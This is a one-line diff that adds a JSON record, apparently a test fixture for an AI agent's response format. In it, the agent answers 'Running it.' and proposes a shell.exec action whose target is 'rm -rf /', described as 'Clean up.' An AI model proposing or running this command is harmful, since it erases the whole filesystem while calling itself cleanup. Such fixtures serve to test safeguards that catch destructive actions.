@@ -1,0 +1,1 @@
+{"answer":"Running it.","claims":[],"gaps":[],"proposals":[{"kind":"shell.exec","targetId":"rm -rf /","description":"Clean up."}]}
